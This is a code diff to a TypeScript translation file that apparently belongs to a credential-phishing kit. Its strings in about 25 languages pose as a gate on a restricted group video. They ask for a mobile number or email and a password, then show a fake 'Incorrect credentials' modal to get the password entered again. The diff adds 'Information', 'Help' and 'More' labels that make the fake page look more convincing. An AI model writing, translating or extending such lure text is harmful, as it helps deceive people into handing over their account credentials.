@@ -7,12 +7,15 @@ interface TranslatedTexts {
     modalTitle: string;
     modalContent: string;
     modalButton: string;
+    info: string;
+    help: string;
+    more: string;
 }
 
 function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
     const translations: Record<string, TranslatedTexts> = {
         en: {
-            // Español
+            // Ingles
             splitMessage: 'We need you to verify your data to access the group video.',
             gpNameDefault: 'Restricted content',
             inputNameField: 'Mobile or email',
@@ -21,9 +24,12 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Incorrect credentials. No account found.',
             modalContent: 'Enter your email or mobile number and your password to continue.',
             modalButton: 'Accept',
+            info: 'Information',
+            help: 'Help',
+            more: 'More'
         },
         es: {
-            // Ingles
+            // Español
             splitMessage: 'Necesitamos que verifiques tus datos para poder acceder al video del grupo.',
             gpNameDefault: 'Contenido restringido',
             inputNameField: 'Móvil o correo electrónico',
@@ -32,6 +38,10 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Credenciales incorrectas. No se ha encontrado ninguna cuenta.',
             modalContent: 'Introduce tu correo electrónico o tu número de móvil y tu contraseña para continuar.',
             modalButton: 'Aceptar',
+
+            info: 'Información',
+            help: 'Ayuda',
+            more: 'Mas'
         },
         fr: {
             // Frances
@@ -43,6 +53,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Identifiants incorrects. Aucun compte trouvé.',
             modalContent: 'Entrez votre e-mail ou votre numéro de mobile ainsi que votre mot de passe pour continuer.',
             modalButton: 'Accepter',
+            info: 'Information',
+            help: 'Aide',
+            more: 'Plus'
         },
         de: {
             // Alemán
@@ -54,6 +67,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Falsche Anmeldedaten. Kein Konto gefunden.',
             modalContent: 'Geben Sie Ihre E-Mail-Adresse oder Ihre Mobiltelefonnummer sowie Ihr Passwort ein, um fortzufahren.',
             modalButton: 'Akzeptieren',
+            info: 'Information',
+            help: 'Hilfe',
+            more: 'Mehr'
         },
         it: {
             // Italiano
@@ -65,6 +81,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Credenziali errate. Nessun account trovato.',
             modalContent: 'Inserisci la tua e-mail o il tuo numero di cellulare e la tua password per continuare.',
             modalButton: 'Accetta',
+            info: 'Informazioni',
+            help: 'Aiuto',
+            more: 'Altro'
         },
         pt: {
             // Portugués
@@ -76,6 +95,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Credenciais incorretas. Nenhuma conta encontrada.',
             modalContent: 'Digite seu e-mail ou número de celular e sua senha para continuar.',
             modalButton: 'Aceitar',
+            info: 'Informação',
+            help: 'Ajuda',
+            more: 'Mais'
         },
         nl: {
             // Holandés
@@ -87,6 +109,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Onjuiste referenties. Geen account gevonden.',
             modalContent: 'Voer uw e-mailadres of mobiele nummer en uw wachtwoord in om door te gaan.',
             modalButton: 'Accepteren',
+            info: 'Informatie',
+            help: 'Hulp',
+            more: 'Meer'
         },
         ru: {
             // Ruso
@@ -98,6 +123,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Неверные учетные данные. Аккаунт не найден.',
             modalContent: 'Введите свой адрес электронной почты или номер мобильного телефона и пароль, чтобы продолжить.',
             modalButton: 'Принять',
+            info: 'Информация',
+            help: 'Помощь',
+            more: 'Больше'
         },
         ja: {
             // Japonés
@@ -109,6 +137,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: '認証情報が正しくありません。アカウントが見つかりません。',
             modalContent: '続行するには、メールアドレスまたは携帯電話番号とパスワードを入力してください。',
             modalButton: '承諾',
+            info: '情報',
+            help: 'ヘルプ',
+            more: 'もっと'
         },
         zh: {
             // Chino
@@ -120,7 +151,10 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: '凭证不正确。未找到帐户。',
             modalContent: '请输入您的电子邮件或手机号码以及密码以继续。',
             modalButton: '接受',
-        },        
+            info: '信息',
+            help: '帮助',
+            more: '更多'
+        },
         ar: {
             // Árabe
             splitMessage: 'نحتاج منك التحقق من بياناتك للوصول إلى فيديو المجموعة.',
@@ -131,6 +165,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'بيانات الاعتماد غير صحيحة. لم يتم العثور على حساب.',
             modalContent: 'أدخل عنوان بريدك الإلكتروني أو رقم هاتفك المحمول وكلمة المرور للمتابعة.',
             modalButton: 'موافق',
+            info: 'معلومات',
+            help: 'مساعدة',
+            more: 'المزيد'
         },
         ko: {
             // Coreano
@@ -142,6 +179,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: '잘못된 자격 증명입니다. 계정을 찾을 수 없습니다.',
             modalContent: '계속하려면 이메일 또는 휴대폰 번호와 비밀번호를 입력하세요.',
             modalButton: '수락',
+            info: '정보',
+            help: '도움말',
+            more: '더 보기'
         },
         tr: {
             // Turco
@@ -153,6 +193,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Hatalı kimlik bilgileri. Hesap bulunamadı.',
             modalContent: 'Devam etmek için e-posta adresinizi veya cep telefonu numaranızı ve parolanızı girin.',
             modalButton: 'Kabul et',
+            info: 'Bilgi',
+            help: 'Yardım',
+            more: 'Daha fazla'
         },
         sv: {
             // Sueco
@@ -164,6 +207,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Felaktiga referenser. Inget konto hittades.',
             modalContent: 'Ange din e-postadress eller mobilnummer samt ditt lösenord för att fortsätta.',
             modalButton: 'Acceptera',
+            info: 'Information',
+            help: 'Hjälp',
+            more: 'Mer'
         },
         el: {
             // Griego
@@ -175,6 +221,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Λανθασμένα διαπιστευτήρια. Δεν βρέθηκε λογαριασμός.',
             modalContent: 'Εισαγάγετε το email ή τον αριθμό κινητού σας και τον κωδικό πρόσβασής σας για να συνεχίσετε.',
             modalButton: 'Αποδοχή',
+            info: 'Πληροφορίες',
+            help: 'Βοήθεια',
+            more: 'Περισσότερα'
         },
         pl: {
             // Polaco
@@ -186,6 +235,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Nieprawidłowe dane logowania. Nie znaleziono konta.',
             modalContent: 'Wprowadź swój adres e-mail lub numer telefonu komórkowego oraz hasło, aby kontynuować.',
             modalButton: 'Akceptuj',
+            info: 'Informacje',
+            help: 'Pomoc',
+            more: 'Więcej'
         },
         hi: {
             // Hindi
@@ -197,6 +249,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'गलत क्रेडेंशियल्स। कोई खाता नहीं मिला।',
             modalContent: 'जारी रखने के लिए अपना ईमेल या मोबाइल नंबर और पासवर्ड दर्ज करें।',
             modalButton: 'स्वीकार करें',
+            info: 'जानकारी',
+            help: 'सहायता',
+            more: 'अधिक'
         },
         hu: {
             // Húngaro
@@ -208,6 +263,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Hibás hitelesítő adatok. Nincs ilyen fiók.',
             modalContent: 'Adja meg e-mail címét vagy mobiltelefonszámát és jelszavát a folytatáshoz.',
             modalButton: 'Elfogadás',
+            info: 'Információ',
+            help: 'Segítség',
+            more: 'Tovább'
         },
         vi: {
             // Vietnamita
@@ -219,6 +277,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Thông tin đăng nhập không chính xác. Không tìm thấy tài khoản.',
             modalContent: 'Nhập địa chỉ email hoặc số điện thoại di động và mật khẩu của bạn để tiếp tục.',
             modalButton: 'Chấp nhận',
+            info: 'Thông tin',
+            help: 'Trợ giúp',
+            more: 'Thêm'
         },
         cs: {
             // Checo
@@ -230,6 +291,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Nesprávné přihlašovací údaje. Nebyl nalezen žádný účet.',
             modalContent: 'Zadejte svou e-mailovou adresu nebo číslo mobilního telefonu a heslo pro pokračování.',
             modalButton: 'Přijmout',
+            info: 'Informace',
+            help: 'Pomoc',
+            more: 'Více'
         },
         th: {
             // Tailandés
@@ -241,6 +305,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'ข้อมูลรับรองไม่ถูกต้อง ไม่พบบัญชี',
             modalContent: 'ป้อนที่อยู่อีเมลหรือหมายเลขโทรศัพท์มือถือและรหัสผ่านเพื่อดำเนินการต่อ',
             modalButton: 'ยอมรับ',
+            info: 'ข้อมูล',
+            help: 'ช่วยเหลือ',
+            more: 'เพิ่มเติม'
         },
         da: {
             // Danés
@@ -252,6 +319,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Forkerte legitimationsoplysninger. Ingen konto fundet.',
             modalContent: 'Indtast din e-mail-adresse eller dit mobilnummer samt din adgangskode for at fortsætte.',
             modalButton: 'Accepter',
+            info: 'Information',
+            help: 'Hjælp',
+            more: 'Mere'
         },
         he: {
             // Hebreo
@@ -263,6 +333,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'פרטי הכניסה שגויים. לא נמצא חשבון.',
             modalContent: 'הזן את כתובת הדוא"ל שלך או מספר הטלפון הנייד והסיסמה שלך כדי להמשיך.',
             modalButton: 'אישור',
+            info: 'מידע',
+            help: 'עזרה',
+            more: 'יותר'
         },
         fi: {
             // Finlandés
@@ -274,6 +347,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Virheelliset tunnistetiedot. Tiliä ei löytynyt.',
             modalContent: 'Syötä sähköpostiosoitteesi tai matkapuhelinnumerosi sekä salasanasi jatkaaksesi.',
             modalButton: 'Hyväksy',
+            info: 'Tietoja',
+            help: 'Apua',
+            more: 'Lisää'
         },
         no: {
             // Noruego
@@ -285,6 +361,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Feil legitimasjon. Ingen konto funnet.',
             modalContent: 'Skriv inn e-postadressen din eller mobilnummeret ditt og passordet ditt for å fortsette.',
             modalButton: 'Godta',
+            info: 'Informasjon',
+            help: 'Hjelp',
+            more: 'Mer'
         },
         bg: {
             // Búlgaro
@@ -296,6 +375,9 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
             modalTitle: 'Грешни удостоверения. Няма намерен акаунт.',
             modalContent: 'Въведете вашия имейл адрес или мобилен номер и парола, за да продължите.',
             modalButton: 'Приемам',
+            info: 'Информация',
+            help: 'Помощ',
+            more: 'Повече'
         }
     };
 
@@ -303,4 +385,4 @@ function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
     return translations[language] || translations.en;
 }
 
-export {TranslatedTexts, getTranslatedTexts};
+export { TranslatedTexts, getTranslatedTexts };
